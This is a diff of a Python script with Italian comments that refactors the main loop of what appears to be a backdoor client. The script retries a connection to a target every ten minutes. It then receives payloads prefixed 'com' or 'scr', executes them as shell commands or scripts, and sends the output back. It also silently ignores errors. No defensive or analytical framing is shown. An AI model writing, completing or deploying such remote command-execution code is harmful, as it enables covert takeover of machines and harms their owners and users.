@@ -1,11 +1,13 @@
 #import
 import function
 import time
+Connection = function.Connection()
+Comand = function.Comand()
 
 # loop che tenta la connessione al targhet ogni 10 min
 def tryconn():
     while True:
-        stat_conn = function.Connection.INIT_CONN(function)
+        stat_conn = Connection.INIT_CONN()
         if stat_conn == True:
             break
         time.sleep(600)
@@ -14,22 +16,34 @@ def tryconn():
 def service():
     try:
         while True:
-            payload = function.Operation.RECV(function)
-            index = "".join(payload[0-2])
-            payload.pop(0-2)
-            if payload == False:
+            try:
+                payload = Connection.RECV().decode()
+            except:
                 break
-            else:
+            if payload != False:
+                payload = list(payload)
+                index = []
+                index.append(payload[0])
+                index.append(payload[1])
+                index.append(payload[2])
+                index = "".join(index)
+                payload.pop(0)
+                payload.pop(0)
+                payload.pop(0)
+                payload = "".join(payload)
+
                 # esegue un comando
                 if index == "com":
-                    output = function.Comands.EX_COMMAND(function, payload)
-                    function.Operation.SEND(function, output)
+                    output = Comand.EX_COMMAND(payload)
+                    Connection.SEND(output)
                 #esegue uno script
                 elif index == "scr":
-                    output = function.Comands.EX_SCRIPT(payload)
-                    function.Operation.SEND(function, output)
+                    output = Comand.EX_SCRIPT(payload)
+                    Connection.SEND(output)
                 else:
                     pass
+            else:
+                break
     except:
         pass
 
